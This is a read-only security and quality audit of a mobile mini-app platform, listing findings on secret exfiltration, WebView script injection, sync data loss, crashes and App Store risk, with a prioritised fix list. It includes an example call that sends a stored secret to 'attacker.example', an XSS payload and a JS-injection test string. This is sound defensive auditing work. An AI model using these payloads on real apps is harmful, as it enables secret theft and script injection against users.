# Cottix — Read-Only Security & Quality Audit

## Context

Pre-App-Store-submission audit of the Cottix mobile app (`/perappos`). Read-only: no files were modified. The deliverable is this report plus a prioritized fix list. Findings are grouped by domain. Severity reflects user-impact + likelihood, not effort.

Three parallel Explore agents covered Security, Data Integrity + Crash Risks, and Performance + App Store + Refactoring. Findings flagged "needs verification" are ones the agents inferred without confirming the file exists; treat those as leads, not facts.

---

## 1. SECURITY

### S1. CRITICAL — Anthropic API key committed to `.env`
- **Location**: [.env:4](.env)
- **Issue**: `sk-ant-api03-...` plaintext in repo. Even if `.gitignore` was added later, the key is in history and must be considered compromised.
- **Fix**: Rotate the key in the Anthropic console immediately. Move to EAS secrets / Cloudflare Worker env. Run `git log -p -- .env` to confirm exposure window. Consider `git filter-repo` if the repo is ever made public.

### S2. CRITICAL — JS injection via `injectJavaScript` template-string interpolation
- **Location**: [hooks/useLiveSyncPush.ts:61](hooks/useLiveSyncPush.ts) and any other `injectJavaScript(\`... ${JSON.stringify(x)} ...\`)` site (audit grep needed across [app/app/[id].tsx](app/app/[id].tsx) too)
- **Issue**: `JSON.stringify` produces JSON, but JSON is not a safe JS literal — strings containing `</script>`, line separator U+2028/U+2029, or other JS-only-illegal sequences can break out. More importantly, the value comes from `shared_app_data.value` which is mini-app-controlled. A peer can set a key whose value crafts a JS escape and runs in another peer's WebView with full `VaultAPI` (including `secrets.fetch`).
- **Fix**: Pass payloads via base64 + `JSON.parse(atob('...'))` inside the injected code, or via a `postMessage` round-trip rather than string interpolation. Replace U+2028/U+2029 explicitly as a backstop.

### S3. HIGH — `secrets.fetch` has no domain allowlist
- **Location**: [lib/vaultBridge.ts:457](lib/vaultBridge.ts) (`secrets_fetch` handler)
- **Issue**: Any mini-app can do `VaultAPI.secrets.fetch('openai_key', { url: 'https://attacker.example/x', headers: { x: '{{secret}}' } })` and exfiltrate the key. `product.md` flags allowlisting as the critical control; it is not implemented.
- **Fix**: Persist a per-secret `allowedDomains: string[]` next to the value in SecureStore. Reject `secrets_fetch` if the URL host (and any redirect host) is not on the list. Default deny.

### S4. HIGH — Missing CSP / sandboxing on WebView; `originWhitelist={['*']}`
- **Location**: [app/app/[id].tsx](app/app/[id].tsx) (WebView config) — Tier-1 safeguard from `product.md` not deployed
- **Issue**: Mini-app HTML can load arbitrary scripts and contact arbitrary origins. Combined with S2, this is a full XSS-to-secret-exfil chain. Apple reviewers also look unfavorably on unrestricted remote code execution under guideline 4.7.
- **Fix**: Inject a `<meta http-equiv="Content-Security-Policy">` via `injectedJavaScriptBeforeContentLoaded` with a strict `connect-src` (Supabase + Cloudflare apps domain only by default), `script-src 'unsafe-inline' 'unsafe-eval'` (required by vibe-coded apps), and `default-src 'self'`. Document the trade-offs.

### S5. HIGH — Bridge error messages can echo secret values
- **Location**: [lib/vaultBridge.ts:738](lib/vaultBridge.ts) (generic catch → `respond(null, e.message)`)
- **Issue**: If `fetch()` in `secrets_fetch` throws (DNS failure, TLS error), the error string can include the full URL or header value — and the substituted `{{secret}}` lives in those at the moment of failure. The error is sent back to the WebView.
- **Fix**: For the `secrets_*` cases specifically, return generic strings like `"request_failed"` and log the real error to native console only.

### S6. HIGH — `instance_members` RLS disabled is correct, but no integration test verifies sync rules enforce isolation
- **Location**: [supabase/migrations/20260401_join_approval.sql:53](supabase/migrations/20260401_join_approval.sql) and PowerSync sync rules (dashboard, not in repo)
- **Issue**: The disable is intentional (per `learning.md`), but a single sync-rule regression (table alias, wrong filter) silently exposes every member of every instance. There's no test that catches this.
- **Fix**: Add a one-screen integration test (or a documented manual check) that signs in as user A, queries `instance_members` PowerSync table, and asserts only A's instances appear.

### S7. MEDIUM — Display name written to `shared_app_data` is not sanitized
- **Location**: [lib/vaultBridge.ts:164](lib/vaultBridge.ts) (`_bridgeUser.displayName` from Supabase metadata) → activity panel in `app/shared-instance/[instanceId].tsx`
- **Issue**: A user can set their display name to `<img src=x onerror=...>`. RN `<Text>` is safe by default, but if attribution ever flows into a WebView, it's an XSS sink.
- **Fix**: Strip HTML / cap length / allowlist characters at write time (cheap defense in depth). Never inject attribution into mini-app HTML.

### S8. MEDIUM — Deep link auth callback accepts tokens with no source check
- **Location**: [app/_layout.tsx:357](app/_layout.tsx) Linking listener + [app/+native-intent.tsx](app/+native-intent.tsx)
- **Issue**: A `cottix://auth/callback#access_token=...&refresh_token=...` link from any source (email, web page, NFC) sets the session. An attacker who tricks a user into tapping a malicious link logs the user into the attacker's account, exfiltrating any data the user creates afterward.
- **Fix**: Add a state nonce stored at sign-in start and verify on callback. At minimum, require the callback to arrive within N seconds of an in-app sign-in attempt.

### S9. LOW — Hardcoded `respond(true)` on bridge writes that may have failed
- **Location**: [lib/vaultBridge.ts:316](lib/vaultBridge.ts) (`db_delete`, `db_clear`)
- **Issue**: Errors are swallowed; mini-apps believe a delete succeeded.
- **Fix**: Inspect `.execute()` result and return `false` / error code on failure.

---

## 2. DATA INTEGRITY

### D1. CRITICAL — Partial CRUD batch can lose writes
- **Location**: [services/sync/SupabaseConnector.ts:122–226](services/sync/SupabaseConnector.ts)
- **Issue**: `uploadData()` processes ops sequentially. If op N throws, ops 1..N-1 may already be considered uploaded by PowerSync (the loop continued past them). PowerSync retries the whole batch on next cycle, but since transaction.complete() is conditional, the state can desync depending on where the throw landed.
- **Fix**: Wrap loop in try/catch; do not call `transaction.complete()` until every op succeeds. PowerSync will redrive cleanly. Add explicit per-op logging so future failures are diagnosable.
- **Status**: ✓ Already correctly implemented — transaction.complete() is placed after the full loop.

### D2. HIGH — `_versionCache` updated *after* the write
- **Location**: [services/sync/bridge-merge-handler.ts:225](services/sync/bridge-merge-handler.ts)
- **Issue**: If the write throws between `newVersion` calculation and cache update, next attempt re-uses the same version → Supabase rejects with version conflict, write is dropped silently from the user's POV.
- **Fix**: Update cache before write attempt; subtract back on failure (or accept the higher version since rollback isn't possible — Supabase will reconcile).

### D3. HIGH — `JSON.parse` in merge path without value-shape validation
- **Location**: [services/sync/bridge-merge-handler.ts:249](services/sync/bridge-merge-handler.ts)
- **Issue**: Strings like `"null"`, `"true"`, `"42"` parse successfully but downstream array/object code crashes. Caught by an outer try and silently downgraded to LWW with no user signal.
- **Fix**: Type-guard `parsed` is `object` or `array` before strategy dispatch; explicitly flag `null`/primitive merges as `lww` with a telemetry counter.

### D4. MEDIUM — `mergeArraysById` accepts empty-string IDs
- **Location**: [services/sync/three-way-merge.ts:40](services/sync/three-way-merge.ts) (path inferred — verify)
- **Issue**: Two items with `id=""` collide in the merge map → silent data loss.
- **Fix**: Skip items with falsy/empty IDs; surface as a conflict count.

### D5. MEDIUM — Pending shim writes lost across `location.reload()` live-sync
- **Location**: [lib/vaultShimSync.ts:71](lib/vaultShimSync.ts) (debounce queue) + reload trigger in same file
- **Issue**: A write enqueued at T=0 with 150ms debounce is flushed to the bridge by an incoming `_VaultSyncPush` reload at T=80ms. Pending write evaporates.
- **Fix**: Synchronously flush `_writeQueue` before triggering reload, or persist it into `window.name` alongside `_cache` and re-process on shim init.

### D6. MEDIUM — Freeze check fails open when `shared_instances` row not yet synced
- **Location**: [services/sync/bridge-merge-handler.ts:155](services/sync/bridge-merge-handler.ts)
- **Issue**: Cold start before initial sync → write proceeds, gets uploaded, Supabase RLS rejects, user thinks save succeeded.
- **Fix**: Add Supabase fallback query when local row missing (matching the pattern already used elsewhere for sync gaps).

### D7. MEDIUM — `clientWriteId` is `Math.random()`-based; retries bypass idempotency check
- **Location**: [lib/vaultShimSync.ts:171](lib/vaultShimSync.ts) (`_genWriteId`)
- **Issue**: Network retry generates a new ID → server can't dedupe → duplicate effects on arrays/objects merged at item granularity.
- **Fix**: Derive ID deterministically from `key + value-hash + base-version` so retries collide. Or persist write IDs on the shim side and reuse on retry.

### D8. MEDIUM — Leaving a shared instance keeps the leaver's writes server-side
- **Location**: [services/collaborationService.ts](services/collaborationService.ts) `leaveSharedGroup`
- **Issue**: After leave, peers still see your contributions tagged with your name. Privacy expectation mismatch.
- **Fix**: Decide product policy (keep / wipe / anonymize). If wipe: `DELETE FROM shared_app_data WHERE updated_by = me` server-side via RPC.

### D9. LOW — `isSuspiciousInit` heuristic blocks legitimate big deletes
- **Location**: [services/sync/bridge-merge-handler.ts:370](services/sync/bridge-merge-handler.ts)
- **Issue**: `incoming.length < current.length * 0.5` triggers on real "clear completed" actions. Currently fail-closed.
- **Fix**: Require additional signals (`pageAge`, no user-interaction flag) before blocking.

---

## 3. CRASH RISKS

### C1. HIGH — Unhandled rejections in `useGenerateApp` polling
- **Location**: [hooks/useGenerateApp.ts:81](hooks/useGenerateApp.ts) (`setInterval` Supabase query)
- **Issue**: `.then()` without `.catch()`. RN treats unhandled rejections as warnings in dev and may surface them in production via Sentry as noise; on iOS strict modes they can crash.
- **Fix**: Add `.catch(() => {})` or wrap in async try/catch.

### C2. HIGH — Unhandled rejections in `useUserProfile` mutators
- **Location**: [hooks/useUserProfile.ts:120](hooks/useUserProfile.ts)
- **Issue**: `updateDisplayName` / `updateAvatarEmoji` await `.update()` then call `fetchProfile()`; no try/catch, no error propagation contract. RLS denials become unhandled rejections.
- **Fix**: try/catch and re-throw with a typed error so callers can show toasts.

### C3. MEDIUM — `JSON.parse(window.name)` without try/catch
- **Location**: [lib/vaultShimSync.ts:51](lib/vaultShimSync.ts)
- **Issue**: Corrupt persisted state (mid-write crash, third-party tooling overwriting `window.name`) breaks shim init → mini-app loads with no `VaultAPI`.
- **Fix**: try/catch, fall back to preloaded data.

### C4. MEDIUM — Async setState after unmount in initial-load effects
- **Location**: [hooks/useWebViewApp.ts:216](hooks/useWebViewApp.ts), [hooks/useRestoreApps.ts:44](hooks/useRestoreApps.ts)
- **Issue**: Multi-step async chains call `setState` without checking if the effect was cleaned up. Visible as React warnings in dev; in production causes wasted renders and occasional ghost state.
- **Fix**: Add an `AbortController` (already used elsewhere in the codebase) or `isMountedRef` and gate every `setState`.

### C5. MEDIUM — Silent failure if `bundle_path` is whitespace-only
- **Location**: [hooks/useWebViewApp.ts:256](hooks/useWebViewApp.ts)
- **Issue**: Per `learning.md` an empty `bundle_path` resolves to an Expo web asset on physical devices. Truthy-check passes whitespace through.
- **Fix**: `if (foundApp.bundle_path?.trim())`.
- **Status**: ✓ Already correctly guarded.

### C6. LOW — Lazy native module errors conflated with permission denials
- **Location**: [lib/vaultBridge.ts:348](lib/vaultBridge.ts) (`device_haptic`, `device_notify`)
- **Issue**: Mini-apps can't tell "permission denied" from "module unlinked".
- **Fix**: Distinct error codes per failure mode.

---

## 4. PERFORMANCE

### P1. HIGH — No SQLite indexes on hot columns
- **Location**: [app/_layout.tsx:35](app/_layout.tsx) `initializeDatabase`
- **Issue**: `apps.source_type`, `apps.last_opened`, `app_data.app_id`, `shared_data.category` are queried frequently with no index → full table scans. Negligible for early users, painful past ~500 rows.
- **Fix**: Add `CREATE INDEX IF NOT EXISTS ...` for each in the init script. Guard with `IF NOT EXISTS` so it's idempotent on existing installs.

### P2. MEDIUM — `_VaultSyncPush` 800ms reload debounce loses transient component state
- **Location**: [lib/vaultShimSync.ts](lib/vaultShimSync.ts) reload path
- **Issue**: Mid-typing reload wipes uncommitted form state. Acceptable today (per `learning.md` this is the chosen trade-off), but worth flagging that any text-heavy collaborative app will frustrate users.
- **Fix**: Detect `document.activeElement` is an input and defer reload until blur or after a longer idle window.

### P3. MEDIUM — Personal-app `localStorage.setItem` triggers one PowerSync write per call
- **Location**: [lib/vaultBridge.ts:230](lib/vaultBridge.ts) (`ls_set` for personal apps)
- **Issue**: Bulk writes (20 setItem calls in 50ms) → 20 SQLite writes + 20 CRUD-queue entries → 20 Supabase upserts.
- **Fix**: Add the same 50–150ms debounce/coalesce that the shared shim already has.

### P4. LOW — `db.watch()` re-fires on instanceId/appId change without debounce
- **Location**: [hooks/useLiveSyncPush.ts:37](hooks/useLiveSyncPush.ts)
- **Issue**: Rapid app switching can spam new watchers before old ones tear down.
- **Fix**: 100ms debounce on watcher creation; existing AbortController cleanup is correct.

---

## 5. APP STORE RISK

### A1. CRITICAL — No CSP / sandboxing on user-pasted or AI-generated HTML (= S4)
- See S4. This is the single biggest pre-submission risk. Combined with S3 (no domain allowlist) and S2 (JS injection), Apple's security review may reject; even if not, a single user-reported exfil incident triggers takedown.

### A2. HIGH — `babel-plugin-transform-remove-console` not configured
- **Location**: [babel.config.js](babel.config.js)
- **Issue**: Direct `console.log` calls (and any third-party SDK debug logging) reach production builds. Codebase appears to use a noop logger in prod, but mini-app code and library internals don't.
- **Fix**: Add `transform-remove-console` to the production preset (keep `error`, `warn`).

### A3. MEDIUM — Verify Guide tab is not "browseable app directory"
- **Location**: [app/(tabs)/guide.tsx](app/(tabs)/guide.tsx)
- **Issue**: Per `product.md`, Discover/Guide must be invite-only / non-browseable to avoid 4.2 / 4.7 concerns. Confirm Guide only contains help docs, never a list of community apps. If a public gallery is ever added, gate behind invite codes or web-only.

### A4. MEDIUM — `Info.plist` permission strings audit
- **Location**: [app.json](app.json)
- **Issue**: Photo library string is configured via plugin. Confirm explicit `infoPlist` strings exist for any other permission the app requests at runtime (notifications, camera if added, contacts). Missing strings → instant App Store rejection.
- **Fix**: Inventory every native permission and add usage strings before submission.

---

## 6. REFACTORING OPPORTUNITIES

### R1. MEDIUM — `vaultShim.ts` and `vaultShimSync.ts` ~95% duplicated
- **Location**: [lib/vaultShim.ts](lib/vaultShim.ts), [lib/vaultShimSync.ts](lib/vaultShimSync.ts)
- **Issue**: Per `learning.md` they must change in lockstep. One-character typos already caused breakages.
- **Fix**: Build both shims from a single string-template factory: `buildShim({ sync: true|false })`. Sync-only blocks (queue, debounce, `_VaultSyncPush`) are conditional appends. The two callers each pick their flavor. This eliminates duplication without breaking the "different injected JS for personal vs shared" requirement.

### R2. MEDIUM — `lib/vaultBridge.ts` is a 700-line switch
- **Location**: [lib/vaultBridge.ts:150](lib/vaultBridge.ts)
- **Fix**: Replace `switch (type)` with a `handlers: Record<string, Handler>` registry. Each handler is its own function in `lib/bridge/handlers/*.ts`. Test in isolation.

### R3. MEDIUM — `app/app/[id].tsx` orchestrates too many concerns
- **Location**: [app/app/[id].tsx](app/app/[id].tsx)
- **Fix**: Extract `<FrozenBanner>`, `<StaleBundleBanner>`, `<WebViewHeader>`. Keep the file as a slim composition root.

### R4. LOW — Edge-function RPC version-fallback duplicated
- **Location**: [services/sync/SupabaseConnector.ts](services/sync/SupabaseConnector.ts) and elsewhere
- **Fix**: One `callRpcWithFallback(name, paramsNew, paramsOld)` helper that catches `PGRST202` and retries.

### R5. LOW — Stale TODO: one-time CRUD queue flush in PowerSyncProvider
- **Location**: [services/sync/PowerSyncProvider.tsx](services/sync/PowerSyncProvider.tsx)
- **Issue**: `CLAUDE.md` lists this for removal. Leaving it in is harmless but obscures intent.
- **Fix**: Confirm clean queues across devices, then delete the block.

---

## Prioritized Fix List

### Must fix before App Store submission (week-of-submit)
1. **S1** — Rotate the leaked Anthropic API key. *Now.*
2. **S2** — Sanitize `injectJavaScript` payloads (use base64 + `JSON.parse(atob(...))`).
3. **S3** — Implement domain allowlist for `secrets.fetch`.
4. **S4 / A1** — Inject CSP into WebView; restrict `connect-src` to Supabase + `apps.cottix.co` by default; document escape hatch.
5. **S5** — Generic error strings on `secrets_*` failures.
6. **S8** — Nonce on auth deep link callback.
7. **A2** — Strip `console.log` in production via babel plugin.
8. **A4** — Audit `Info.plist` permission strings.
9. **D1** — Don't `transaction.complete()` on partial CRUD failure. ✓ Already fixed.
10. **C1, C2, C3** — Add try/catch / `.catch()` to the three identified unhandled-rejection sites.
11. **A3** — Confirm Guide tab doesn't list community apps.

### Should fix in the first post-launch sprint
12. **D2, D3, D5, D6, D7** — Merge engine hardening: cache before write, value-shape validation, flush-before-reload, freeze fallback, deterministic write IDs.
13. **D8** — Decide policy for leaver's data; implement.
14. **C4, C5** — Async-after-unmount + bundle_path whitespace. ✓ C5 already fixed.
15. **P1** — SQLite indexes (one-line migration, big perceived perf win past 500 apps).
16. **S6** — Integration test for `instance_members` cross-user isolation.
17. **S7, S9** — Display name sanitation + bridge `respond(true)` audit.

### Can wait until needed
18. **P2, P3, P4** — Performance polish.
19. **R1, R2, R3** — Refactors. Worth doing once a regression is caused, not before.
20. **D4, D9, C6, R4, R5** — Low-impact cleanups.

---

## Verification (post-fix)

- **S1**: `git log --all -p -- .env | grep sk-ant` should still show the old key (history) but the Anthropic console shows it revoked.
- **S2**: Add a test mini-app that writes `value = '"});alert(1)//'` and confirm no alert fires on the peer.
- **S3**: Test `secrets.fetch` to a non-allowlisted domain — must return error without making the request.
- **S4**: Inspect WebView via Safari Web Inspector → confirm CSP meta present and `connect-src` blocks `attacker.example`.
- **A2**: `grep -r "console.log" dist/` on a release build should return nothing from app code.
- **D1**: Force a CRUD batch failure (temporarily break RLS for one row) → confirm queue retries cleanly without dropping prior ops.
- **C1–C3**: Run with `__DEV__` strict-mode unhandled-rejection handler; trigger each path; confirm no warnings.

No code changes were made during this audit.
